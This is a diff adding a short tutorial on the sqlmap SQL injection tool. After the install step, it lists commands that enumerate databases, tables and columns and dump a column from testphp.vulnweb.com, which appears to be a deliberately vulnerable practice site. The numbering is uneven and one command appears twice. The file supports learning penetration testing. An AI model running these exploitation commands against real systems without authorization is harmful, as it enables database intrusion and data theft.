@@ -1,0 +1,28 @@
+Sqlmap 
+One of the most useful and powerful tools for assessing SQL injection vulnerabilities is sqlmap, a 
+Python tool that automates the reconnaissance and exploitation of Firebird, Microsoft SQL, MySQL, 
+Oracle, PostgreSQL, Sybase, and SAP MaxDB databases.
+
+==>sudo apt install sqlmap
+==>sqlmap -h
+
+1.Open Kali and from the terminal, enter the following: 
+a.Database
+
+==>sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --dbs
+
+We will check for all the tables of that database using the following command: 
+b.tables 
+==>sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --tables
+==>sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --tables
+
+==>sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart --tables
+
+3. Columns 
+==>sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T artists --columns
+
+4.dump 
+==>sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T artists -C aname --dump
+
+
+
